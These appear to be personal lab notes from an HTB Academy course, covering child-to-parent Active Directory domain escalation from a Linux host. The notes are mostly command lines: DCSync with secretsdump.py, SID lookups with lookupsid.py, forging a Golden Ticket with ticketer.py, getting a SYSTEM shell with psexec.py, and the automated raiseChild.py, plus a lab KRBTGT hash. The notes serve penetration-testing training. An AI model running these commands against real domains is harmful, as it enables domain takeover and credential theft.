We can also perform the attack shown in the previous section from a Linux attack host. **To do so, we'll still need to gather the same bits of information:**
- The **KRBTGT hash for the child domain**
- The **SID for the child domain**
- The **name of a target user in the child domain** (does not need to exist!)
- The **FQDN of the child domain**
- The **SID of the Enterprise Admins group** of the root domain

## Performing DCSync with secretsdump.py
- Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, **we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.**

	- `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
	- ![[Pasted image 20250817054134.png]]

## Performing SID Brute Forcing using lookupsid.py
- Next, we can use **[lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain**. 
- In this command, **whatever we specify for the IP address** (the IP of the domain controller in the child domain) **will become the target domain for a SID lookup.**
- The tool will **give us back the SID for the domain and the RIDs for each user and group** that could be used to **create their SID in the format `DOMAIN_SID-RID`**
- For example, from the output below, **we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.**

	- `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 `
	- ![[Pasted image 20250817054400.png]]
## Grabbing the Domain SID & Attaching to Enterprise Admin's RID
- [Here](https://adsecurity.org/?p=1001) is a handy **list of well-known SIDs.**
- `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`
- ![[Pasted image 20250817054604 1.png]]

## Constructing a Golden Ticket using ticketer.py
- Next, we can **use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket.**
- This ticket will be **valid to access resources in the child domain (specified by `-domain-sid`)** and the **parent domain (specified by `-extra-sid`).**:

	- `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`
	- ![[Pasted image 20250817054653.png]]

## Setting the KRB5CCNAME Environment Variable
- The ticket will be **saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file**, which is a file used to **hold Kerberos credentials.**
- **==Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.==**
- `export KRB5CCNAME=hacker.ccache`

## Getting a SYSTEM shell using Impacket's psexec.py
- `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`

- Impacket **also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain**. 
- We need to **specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.**

## Performing the Attack with raiseChild.py
- `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`

- Though **tools such as `raiseChild.py` can be handy and save us time**, it is essential to **understand the process and be able to perform the more manual version** by gathering all of the required data points.
- Other t**ools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function** that can attempt to perform **each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path).**
  
	- `We don't want to tell the client that something broke because we used an "autopwn" script!`

# LABS
---
- Everything is same, to dump use:
	- `secretsdump.py logistics.inlanefreight.local/hacker@academy-ea-dc01.inlanefreight.local -just-dc-user bross -no-pass -k`
	- ![[Pasted image 20250817060500.png]]